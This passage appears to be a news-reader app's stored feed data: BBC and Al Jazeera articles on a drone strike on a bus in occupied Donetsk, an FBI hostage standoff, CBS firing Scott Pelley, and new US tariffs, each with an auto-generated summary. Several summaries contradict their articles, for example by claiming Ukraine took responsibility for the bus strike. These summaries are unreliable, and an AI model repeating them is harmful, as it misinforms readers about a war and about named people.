a criminal case into what they described as a &#34;terrorist attack&#34; on civilians.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/b716/live/a4cea420-5f34-11f1-8b8c-6d33e1d5abb6.jpg.webp" loading="lazy" alt="Reuters A frontal view of a destroyed civilian bus in the Russian-occupied region of Donetsk. The inside of the white bus is completely burnt out and the windows have been shattered.   "/><span>Reuters</span></p></div><p><figcaption>Ukraine has not claimed responsibility for the strike</figcaption></p></figure></div><div data-component="text-block"><p>Svetlana Petrenko, spokesperson for the Russian Investigative Committee, said authorities were working to establish the identities of those responsible for the strike.</p></div><div data-component="text-block"><p>Fifty-three people had been registered to travel on the bus, Russia&#39;s state-run media report, however, none of the victims&#39; identities have been released yet.</p></div><div data-component="video-block"><figure><div orientation="landscape"><figcaption>Drone strike hits Russian oil depot in St Petersburg area</figcaption></div></figure></div><div data-component="text-block"><p>Andriy Kovalenko, the head of the Ukrainian government&#39;s centre for combating disinformation, has talked about a &#34;parallel reality&#34; created by Russian state propaganda, while not explicitly denying claims that the strike took place.</p></div><div data-component="text-block"><p>&#34;Russia attacks civilians with drones all the time... of course, when everyone is talking about this, when there is evidence of such actions by the Russians, they use their main propaganda tool: creating a parallel reality,&#34; he told the BBC.</p></div><div data-component="text-block"><p>&#34;Against this background of attacks on our civilians, they come up with stories in which Ukraine acts just like Russia. This is done to justify their own terror as a response to our actions.&#34;</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/c092/live/5b875650-5f29-11f1-8b8c-6d33e1d5abb6.png.webp" loading="lazy" alt="A BBC map titled “Areas of Russian military control in Ukraine” shows Ukraine and surrounding countries in Eastern Europe. Ukraine is displayed centrally in white, bordered by Belarus to the north, Russia to the east, and Moldova to the southwest. The Black Sea appears in blue along Ukraine’s southern coast.
+
+Areas shaded in pink/red indicate regions under Russian military control, primarily concentrated in the east and south of Ukraine, including much of the Donetsk region, a southern corridor stretching westward toward Kherson, and the entire Crimea peninsula, which is labelled and outlined. Thin orange lines indicate areas of claimed Russian control, while red diagonal stripes mark zones of limited Russian military control, especially along the active front line in eastern Ukraine.
+
+Major cities are labelled with black dots, including Kyiv (central north), Lviv (west), Kharkiv (northeast), Donetsk (east), Zaporizhzhia(southeast-central), Kherson (south), Odesa (southwest coast), and Kursk in Russia. Country names (Ukraine, Russia, Belarus, Moldova) are written in large capital letters.
+
+A small inset globe in the top-left corner highlights Ukraine’s location in Europe. A scale bar in the lower-left corner shows distances of 100 km and 100 miles.
+
+The legend at the bottom explains the color coding:
+
+Pink/red: Russian military control
+Red stripes: Limited Russian military control
+Orange: Claimed Russian control
+Black outline: Russia annexed Crimea in 2014
+A source note reads: “Source: ISW and AEI&#39;s Critical Threats Project (21:00 GMT, 28 May)”, with a BBC logo in the bottom-right corner."/></p></div></figure></div><div data-component="text-block"><p>Drones were downed over Belgorod, Kursk and other western regions, as well as near Moscow and over the Sea of Azov, Russian officials added.</p></div><div data-component="text-block"><p>In total, Russia says it shot down 350 Ukrainian drones overnight. </p></div><div data-component="text-block"><p>At least 50 of those were downed over the Leningrad region north-west of Moscow, according to the regional governor Alexander Drozdenko. St Petersburg is the capital of the region.<b id=""> </b></p></div><div data-component="text-block"><p>&#34;Important facilities on Russian territory were hit last night,&#34; Zelensky wrote on X, sharing a video of black smoke rising above St Petersburg. </p></div><div data-component="text-block"><p>He described the strikes as &#34;long-range sanctions&#34; and said Ukrainian forces also hit military targets in Russia&#39;s Tambov region. </p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/bcbd/live/c194c590-5f24-11f1-9da4-8b99067aa239.jpg.webp" loading="lazy" alt="Getty Images Black smoke rises after Ukraine reportedly launched unmanned aerial vehicle (UAV) attacks on the opening day of the St. Petersburg International Economic Forum"/><span>Getty Images</span></p></div><p><figcaption>Zelensky said Ukraine hit a number of &#34;important targets&#34; in St Petersburg on Wednesday</figcaption></p></figure></div><div data-component="text-block"><p>These overnight strikes saw St Petersburg&#39;s Pulkovo airport temporarily restrict flights, according to Russian aviation watchdog Rosaviatsia.</p></div><div data-component="text-block"><p>Earlier, an 86-year-old woman was killed following a drone attack in Ukraine&#39;s southern Kherson region overnight, Yaroslav Shanko, head of the city&#39;s military administration said.</p></div><div data-component="text-block"><p>This came as part of a wider attack by Moscow overnight, with Ukraine&#39;s air force saying Russia launched 198 drones at several different regions, 189 of which were shot down. </p></div><div data-component="text-block"><p>The latest wave of strikes comes a day after Russia launched one of its largest attacks on Ukraine since its full-scale invasion began in 2022. </p></div><div data-component="text-block"><p>At least 22 people were killed after Russia launched more than 700 missiles and drones overnight into Tuesday, Ukrainian officials said. </p></div><div data-component="text-block"><p>Russia&#39;s defence ministry said the strikes had been a response to previous Ukrainian attacks, saying in a statement that the &#34;strike objectives&#34; had all been achieved.</p></div><div data-component="text-block"><p>The Kremlin said on Tuesday it was carrying out the &#34;systematic strikes&#34; it had pledged after accusing Kyiv of a deadly attack on a student dormitory in an occupied part of eastern Ukraine in late May.</p></div><div data-component="text-block"><p>Kyiv said it had hit a Russian military unit.</p></div><div data-component="text-block"><p>&#34;This practice will continue,&#34; Kremlin spokesman Dmitry Peskov told reporters on Tuesday, claiming the strikes were targeting Ukrainian military infrastructure.</p></div><div data-component="text-block"><p><i id="additional-reporting-by-vitaly-shevchenko.">Additional reporting by Vitaly Shevchenko.</i></p></div></article></div></div>`,content_text:`2 hours agoJames ChaterandHenry MooreReutersAt least eight people were killed in the drone strike, Russian state media reportEight people have been killed and 10 others injured after a drone hit a passenger bus travelling through a Russian-occupied part of Ukraine, Russia has said.Denis Pushilin, the Moscow-installed head of Ukraine's eastern Donetsk region, said the bus was struck in the early hours of Wednesday as it was travelling between a city near Moscow and Simferopol, in Russian-annexed Crimea.Russia has claimed the strike was by a Ukrainian drone. When asked by the BBC whether Kyiv was behind the attack, Ukraine's general staff did not confirm nor deny but said it would not comment "on statements made by the aggressor state".In a Ukraine-held part of the Donetsk region, three people were killed and one injured in Russian shelling of the city of Kramatorsk, local official Vadym Filashkin said.The attack on Russian President Vladimir Putin's hometown thousands of kilometres from Ukraine's border comes as St Petersburg hosts the annual International Economic Forum, an event designed to showcase Russia to the world. Putin is due to speak there on Friday.The strikes come a day after a massive Russian assault on cities across Ukraine killed at least 22 people, including several women and children.In Donetsk, Russian investigators said they had opened a criminal case into what they described as a "terrorist attack" on civilians.ReutersUkraine has not claimed responsibility for the strikeSvetlana Petrenko, spokesperson for the Russian Investigative Committee, said authorities were working to establish the identities of those responsible for the strike.Fifty-three people had been registered to travel on the bus, Russia's state-run media report, however, none of the victims' identities have been released yet.Drone strike hits Russian oil depot in St Petersburg areaAndriy Kovalenko, the head of the Ukrainian government's centre for combating disinformation, has talked about a "parallel reality" created by Russian state propaganda, while not explicitly denying claims that the strike took place."Russia attacks civilians with drones all the time... of course, when everyone is talking about this, when there is evidence of such actions by the Russians, they use their main propaganda tool: creating a parallel reality," he told the BBC."Against this background of attacks on our civilians, they come up with stories in which Ukraine acts just like Russia. This is done to justify their own terror as a response to our actions."Drones were downed over Belgorod, Kursk and other western regions, as well as near Moscow and over the Sea of Azov, Russian officials added.In total, Russia says it shot down 350 Ukrainian drones overnight. At least 50 of those were downed over the Leningrad region north-west of Moscow, according to the regional governor Alexander Drozdenko. St Petersburg is the capital of the region. "Important facilities on Russian territory were hit last night," Zelensky wrote on X, sharing a video of black smoke rising above St Petersburg. He described the strikes as "long-range sanctions" and said Ukrainian forces also hit military targets in Russia's Tambov region. Getty ImagesZelensky said Ukraine hit a number of "important targets" in St Petersburg on WednesdayThese overnight strikes saw St Petersburg's Pulkovo airport temporarily restrict flights, according to Russian aviation watchdog Rosaviatsia.Earlier, an 86-year-old woman was killed following a drone attack in Ukraine's southern Kherson region overnight, Yaroslav Shanko, head of the city's military administration said.This came as part of a wider attack by Moscow overnight, with Ukraine's air force saying Russia launched 198 drones at several different regions, 189 of which were shot down. The latest wave of strikes comes a day after Russia launched one of its largest attacks on Ukraine since its full-scale invasion began in 2022. At least 22 people were killed after Russia launched more than 700 missiles and drones overnight into Tuesday, Ukrainian officials said. Russia's defence ministry said the strikes had been a response to previous Ukrainian attacks, saying in a statement that the "strike objectives" had all been achieved.The Kremlin said on Tuesday it was carrying out the "systematic strikes" it had pledged after accusing Kyiv of a deadly attack on a student dormitory in an occupied part of eastern Ukraine in late May.Kyiv said it had hit a Russian military unit."This practice will continue," Kremlin spokesman Dmitry Peskov told reporters on Tuesday, claiming the strikes were targeting Ukrainian military infrastructure.Additional reporting by Vitaly Shevchenko.`,summary:`• Eight people have been killed and 10 others injured after a drone strike near a passenger bus in Russia's eastern Donetsk region. The bus was struck during an attack by Russian forces, but it is unclear if Kyiv was behind the incident or not. Ukraine has claimed responsibility for the attack, saying that the bus had been hit multiple times earlier in the day. The strikes come as St Petersburg hosts the annual International Economic Forum and Putin's speech there on Friday.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/e122/live/1fbe2850-5f34-11f1-b682-cf91850925ea.jpg`,published_at:1780499908,fetched_at:1780509343,content_hash:`ab3903e470aaebdcf8b7c02445e77e87617fdb403279fea7112c40d5308a1191`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:104,feed_id:11,guid:`https://www.aljazeera.com/?t=1780499609`,url:`https://www.aljazeera.com/news/2026/6/3/fbi-agents-fatally-shoot-alleged-hostage-taker-in-california?traffic_source=rss`,title:`FBI agents fatally shoot alleged hostage-taker in California`,content_html:`<div id="readability-page-1" class="page"><div><p><span>BREAKING, </span></p><p><em>The shooting ends a 12-hour standoff in the city of Bakersfield between suspect and law enforcement.</em></p></div><div aria-live="polite" aria-atomic="true"><p>Agents with the Federal Bureau of Investigations (FBI) in the United States have fatally shot a man allegedly holding hostages inside a building in California.</p><p>The shooting ended a 12-hour standoff at an office in Bakersfield that houses a bank branch and a school district office.</p><section><h2>Recommended Stories </h2><span>list of 3 items</span><ul><li><span>list 1 of 3</span><a href="https://www.aljazeera.com/news/2026/5/20/us-police-officers-sue-trump-over-1-8bn-anti-weaponisation-fund">US police officers sue Trump over $1.8bn ‘anti-weaponisation’ fund</a></li><li><span>list 2 of 3</span><a href="https://www.aljazeera.com/news/2026/5/25/trump-renews-petition-for-white-house-ballroom-pointing-to-nearby-shooting">Trump renews petition for White House ballroom, pointing to nearby shooting</a></li><li><span>list 3 of 3</span><a href="https://www.aljazeera.com/news/2026/5/24/gunman-shot-dead-by-secret-service-agents-near-white-house-what-we-know">Gunman shot dead by Secret Service agents near White House: What we know</a></li></ul><span>end of list</span></section><p>In a statement, the Bakersfield police said the suspect was killed in “an officer-involved shooting involving Federal Bureau of Investigation personnel”.</p><p>It added that “all hostages were located unharmed and received medical evaluation and treatment at the scene”.</p><p>Police had originally been called following a bomb threat at the location. Police said the man barricaded himself inside with several people, two of whom were released Tuesday after negotiations with authorities.</p><p>Authorities established a wide perimeter around the building, evacuating the nearby City Hall and the police headquarters.</p><p>Bakersfield police sergeant, Eric Celedon, told reporters on Tuesday the department had “every single resource at our disposal out here to bring this to the safest resolution possible”.</p><p>Police on Wednesday said the investigation was ongoing and that “significant” law enforcement would remain in the area.</p><p>The identity of the suspect was not immediately released, and a motive was unclear.</p></div></div>`,content_text:`BREAKING, The shooting ends a 12-hour standoff in the city of Bakersfield between suspect and law enforcement.Agents with the Federal Bureau of Investigations (FBI) in the United States have fatally shot a man allegedly holding hostages inside a building in California.The shooting ended a 12-hour standoff at an office in Bakersfield that houses a bank branch and a school district office.Recommended Stories list of 3 itemslist 1 of 3US police officers sue Trump over $1.8bn ‘anti-weaponisation’ fundlist 2 of 3Trump renews petition for White House ballroom, pointing to nearby shootinglist 3 of 3Gunman shot dead by Secret Service agents near White House: What we knowend of listIn a statement, the Bakersfield police said the suspect was killed in “an officer-involved shooting involving Federal Bureau of Investigation personnel”.It added that “all hostages were located unharmed and received medical evaluation and treatment at the scene”.Police had originally been called following a bomb threat at the location. Police said the man barricaded himself inside with several people, two of whom were released Tuesday after negotiations with authorities.Authorities established a wide perimeter around the building, evacuating the nearby City Hall and the police headquarters.Bakersfield police sergeant, Eric Celedon, told reporters on Tuesday the department had “every single resource at our disposal out here to bring this to the safest resolution possible”.Police on Wednesday said the investigation was ongoing and that “significant” law enforcement would remain in the area.The identity of the suspect was not immediately released, and a motive was unclear.`,summary:`• FBI agents fatally shoot alleged hostage-taker in Bakersfield standoff.
+• The shooting ended a 12-hour standoff in California between federal police and a man with the accused holding hostages inside an office building.
+• Police had originally been called following a bomb threat at the location, but authorities established a wide perimeter around the building.`,summary_model:`qwen2.5:0.5b`,image_url:`https://www.aljazeera.com/wp-content/uploads/2026/06/ap_6a204737d82bd-1780500279.jpg?resize=1920%2C1440`,published_at:1780499896,fetched_at:1780509344,content_hash:`b8fb8e8bcb9355592e22d6d69d39922504932f8d37b13edff5c0c10a5972699e`,tags:`News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:67,feed_id:9,guid:`https://www.bbc.com/news/articles/c62rpdkem0mo#1`,url:`https://www.bbc.com/news/articles/c62rpdkem0mo?at_medium=RSS&at_campaign=rss`,title:`CBS News fires correspondent Scott Pelley from 60 Minutes`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/3300/live/130deec0-5f3d-11f1-b027-7de5029274c2.jpg.webp" loading="eager" alt="Getty Images Scott Pelley sits in a chair posing for a portrait "/><span>Getty Images</span></p></div></figure></div><div data-component="text-block"><p>CBS News fired its longtime 60 Minutes anchor Scott Pelley on Tuesday evening, amid an ongoing, tumultuous shakeup of the organisation under new leadership.</p></div><div data-component="text-block"><p>Newly installed CBS News chief Bari Weiss fired a string of staff at the news programme last week, including its longtime executive producer, and tapped a new editor, Nick Bilton, with no broadcast news experience.  </p></div><div data-component="text-block"><p>The moves inflamed concerns the network&#39;s leadership would undermine independent journalism at the US&#39;s longest-running and highest-rated news programme. </p></div><div data-component="text-block"><p>At a staff meeting on Monday, Pelley accused Weiss of &#34;murdering 60 Minutes&#34;, US media reported. Bilton called Pelley uncooperative in a termination letter sent to the host. </p></div><div data-component="text-block"><p>The BBC has contacted CBS News for comment. </p></div><div data-component="text-block"><p>In a statement after his firing, Pelley accused the organisation of becoming more politicised and forcing him to &#34;inject falsehoods and bias&#34; into his work.</p></div><div data-component="text-block"><p>&#34;I&#39;ve been told to include assertions that are unverified,&#34; he continued.</p></div><div data-component="text-block"><p>Pelley said &#34;incompetence and unprofessionalism in the new management have wreaked havoc&#34;.</p></div><div data-component="text-block"><p>In the letter terminating Pelley&#39;s contract on Tuesday, Bilton accused him of hijacking the staff meeting to disparage Bilton, his qualificatons and intentions with &#34;remarkable incivility and contempt&#34;.</p></div><div data-component="text-block"><p>&#34;Your antipathy to the future of the show has come through loud and clear. And I have heard you,&#34; Bilton wrote. </p></div><div data-component="text-block"><p>He sent a separate memo to 60 Minutes staff, saying he made multiple attempts to have direct conversations with Pelley and could not find common ground.</p></div><div data-component="text-block"><p>&#34;That was not the path Scott chose,&#34; Bilton wrote, according to a letter published by CBS News.</p></div><div data-component="text-block"><p>CBS News has a partnership agreement with the BBC, meaning news content including video footage can be shared. BBC News is editorially independent of CBS.</p></div><div data-component="text-block"><p>The upheaval at the news organisation had been under way since August 2025 when David Ellison, an ally of US President Donald Trump, bought CBS&#39;s parent company, Paramount.</p></div><div data-component="text-block"><p>Ellison installed Weiss as the new editor-in-chief of CBS in October. She has outlined a new vision for CBS News in the digital era. </p></div><div data-component="text-block"><p>Weiss told staff in January that CBS News was relying too heavily on broadcast television and was &#34;not producing a product that enough people want&#34;.  </p></div><div data-component="text-block"><p>&#34;The reality is twofold. First: Not enough people trust us. Not you. Us. As in: the mainstream media,&#34; she said, according to The Hollywood Reporter. &#34;Second: We are not doing enough to meet audiences where they are. So they are leaving us.&#34;</p></div><div data-component="text-block"><p>CBS has since laid off a number of employees - more then 6% of its workforce - and shut down its storied radio division. After the latest season of 60 Minutes ended on 17 May,  the network fired Tanya Simon, its executive producer, and longtime correspondents Sharyn Alfonsi and Cecilia Vega, and hired Bilton to lead the show. </p></div><div data-component="text-block"><p>Vega said in a statement afterwards that executives had tried to influence stories and &#34;insert political bias&#34; and called it &#34;dangerous for the show and dangerous for democracy&#34;.   </p></div><div data-component="text-block"><p>&#34;Today, I lost an amazing job,&#34; she wrote. &#34;But I still have my integrity. To my former colleagues, continue to hold the line.&#34;</p></div><div data-component="text-block"><p>Pelley was the show&#39;s managing editor and anchor and had been a 60 Minutes correspondent for 22 years. He worked at CBS News for 37 years and departs with &#34;a heart brimming with gratitude&#34;, he wrote in his statement.</p></div><div data-component="text-block"><p>Bilton is a former New York Times technology columnist and documentary filmmaker. He said after his hiring that Weiss was bringing him in while audiences for 60 Minutes were increasing - up 9% according to Nielsen ratings - but that was not indicative of its longterm prognosis.</p></div><div data-component="text-block"><p>&#34;It&#39;s still the No. 1 news broadcast in America. But history tells you disruption doesn&#39;t happen immediately when new technology comes along — it&#39;s usually a few years later,&#34; Bilton told CNBC. &#34;We&#39;re on the precipice of this happening to broadcast TV.</p></div></article></div></div>`,content_text:`Getty ImagesCBS News fired its longtime 60 Minutes anchor Scott Pelley on Tuesday evening, amid an ongoing, tumultuous shakeup of the organisation under new leadership.Newly installed CBS News chief Bari Weiss fired a string of staff at the news programme last week, including its longtime executive producer, and tapped a new editor, Nick Bilton, with no broadcast news experience.  The moves inflamed concerns the network's leadership would undermine independent journalism at the US's longest-running and highest-rated news programme. At a staff meeting on Monday, Pelley accused Weiss of "murdering 60 Minutes", US media reported. Bilton called Pelley uncooperative in a termination letter sent to the host. The BBC has contacted CBS News for comment. In a statement after his firing, Pelley accused the organisation of becoming more politicised and forcing him to "inject falsehoods and bias" into his work."I've been told to include assertions that are unverified," he continued.Pelley said "incompetence and unprofessionalism in the new management have wreaked havoc".In the letter terminating Pelley's contract on Tuesday, Bilton accused him of hijacking the staff meeting to disparage Bilton, his qualificatons and intentions with "remarkable incivility and contempt"."Your antipathy to the future of the show has come through loud and clear. And I have heard you," Bilton wrote. He sent a separate memo to 60 Minutes staff, saying he made multiple attempts to have direct conversations with Pelley and could not find common ground."That was not the path Scott chose," Bilton wrote, according to a letter published by CBS News.CBS News has a partnership agreement with the BBC, meaning news content including video footage can be shared. BBC News is editorially independent of CBS.The upheaval at the news organisation had been under way since August 2025 when David Ellison, an ally of US President Donald Trump, bought CBS's parent company, Paramount.Ellison installed Weiss as the new editor-in-chief of CBS in October. She has outlined a new vision for CBS News in the digital era. Weiss told staff in January that CBS News was relying too heavily on broadcast television and was "not producing a product that enough people want".  "The reality is twofold. First: Not enough people trust us. Not you. Us. As in: the mainstream media," she said, according to The Hollywood Reporter. "Second: We are not doing enough to meet audiences where they are. So they are leaving us."CBS has since laid off a number of employees - more then 6% of its workforce - and shut down its storied radio division. After the latest season of 60 Minutes ended on 17 May,  the network fired Tanya Simon, its executive producer, and longtime correspondents Sharyn Alfonsi and Cecilia Vega, and hired Bilton to lead the show. Vega said in a statement afterwards that executives had tried to influence stories and "insert political bias" and called it "dangerous for the show and dangerous for democracy".   "Today, I lost an amazing job," she wrote. "But I still have my integrity. To my former colleagues, continue to hold the line."Pelley was the show's managing editor and anchor and had been a 60 Minutes correspondent for 22 years. He worked at CBS News for 37 years and departs with "a heart brimming with gratitude", he wrote in his statement.Bilton is a former New York Times technology columnist and documentary filmmaker. He said after his hiring that Weiss was bringing him in while audiences for 60 Minutes were increasing - up 9% according to Nielsen ratings - but that was not indicative of its longterm prognosis."It's still the No. 1 news broadcast in America. But history tells you disruption doesn't happen immediately when new technology comes along — it's usually a few years later," Bilton told CNBC. "We're on the precipice of this happening to broadcast TV.`,summary:`• CBS News fires correspondent Scott Pelley from 60 Minutes amid controversy and tensions over its independent journalism policies. Pelley accused Weiss of poisoning the news programme, and Bilton's termination letter came after a staff meeting. The BBC contacted CBS for comment and issued a statement after Pelley’s firing.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/d8bf/live/d0723c60-5f3c-11f1-b027-7de5029274c2.jpg`,published_at:1780499748,fetched_at:1780509343,content_hash:`214a532a4eae38002fbe6caac03f1de920fc2a97b829e1cafbd84e80289620a8`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:66,feed_id:9,guid:`https://www.bbc.com/news/articles/cq6pe7nvldmo#0`,url:`https://www.bbc.com/news/articles/cq6pe7nvldmo?at_medium=RSS&at_campaign=rss`,title:`US announces new tariffs over forced labour concerns`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T15:12:28.159Z">3 hours ago</time></p><p><span data-testid="byline-contributors"><div data-testid="byline-contributors-contributor-0"><p><span>Mitchell Labiak</span><span data-testid="byline-contributors-contributor-0-role-location">Business reporter</span></p></div></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/8644/live/78de3db0-5f27-11f1-9da4-8b99067aa239.jpg.webp" loading="eager" alt="Getty Images A green shipping container vessel appears on the right of the image, in front of a large cityscape in the background."/><span>Getty Images</span></p></div></figure></div><div data-component="text-block"><p>The US has announced new tariffs of 10-12.5% on dozens of countries accounting for almost all its imports over concerns they are not doing enough to tackle forced labour.</p></div><div data-component="text-block"><p>It is the second time President Donald Trump&#39;s administration has announced new import taxes since the US Supreme Court struck down many of his previous duties in February.</p></div><div data-component="text-block"><p>The US Trade Department said these countries will face the tariffs because of their failure to address the importing of goods made with forced labour. </p></div><div data-component="text-block"><p>The UK said it is tackling forced labour, China denied goods are made with forced labour, and the EU said the tariffs were unjustified.</p></div><div data-component="text-block"><p>Meanwhile, an India analyst said the move was a pressure tactic as trade negotiations between the countries continue.</p></div><div data-component="text-block"><p>Human rights groups say forced labour does exist in China and that the UK and other countries need to do more on making sure firms do not have forced labour in their supply chains.</p></div><div data-component="text-block"><p>However, they questioned the effectiveness of US tariffs as a way of dealing with the problem.</p></div><div data-component="text-block"><p>The 60 trading partners listed – including the UK, the EU, Canada, India and Japan – account for almost all of the goods sold to the US.</p></div><div data-component="text-block"><p>The US government&#39;s stance is that trading with countries which buy things made with forced labour is unfair on the US.</p></div><div data-component="text-block"><p>US Trade Representative Jamieson Greer said it &#34;creates a dynamic where American workers are forced to compete globally on an unlevel playing field&#34;.</p></div><div data-component="text-block"><p>The tariffs announced have not yet been enforced. The Trump administration will need to go through a process to do so.</p></div><div data-component="text-block"><p>The report into the investigations concluded that 54 of the countries had &#34;failed to impose a legal prohibition on the importation of goods produced wholly or in part with forced labour and to effectively enforce such a prohibition&#34;.</p></div><div data-component="text-block"><p>It said six other trading partners - Canada, the EU, Ecuador, Indonesia, Mexico and Pakistan - had &#34;failed to effectively enforce a forced labour import prohibition&#34;.</p></div><div data-component="text-block"><p>The trade department said it would impose 10% tariffs on imports from Canada, the EU, Britain, Indonesia, Mexico, Pakistan, Argentina, Bangladesh, Cambodia, El Salvador, Guatemala, Indonesia, Malaysia and Taiwan.</p></div><div data-component="text-block"><p>The remaining 45 countries, which include China and India, would face 12.5% duties.</p></div><div data-component="subheadline-block"><p><h2>&#39;Unjustified&#39; move</h2></p></div><div data-component="text-block"><p>A UK government spokesperson said: &#34;We&#39;re tackling forced labour in the UK and in global supply chains to ensure UK businesses are not complicit in forced labour and human rights violations.</p></div><div data-component="text-block"><p>&#34;We continue to engage regularly with the US administration as part of our negotiations, and have made clear the actions we&#39;re taking.&#34;</p></div><div data-component="text-block"><p>Amnesty 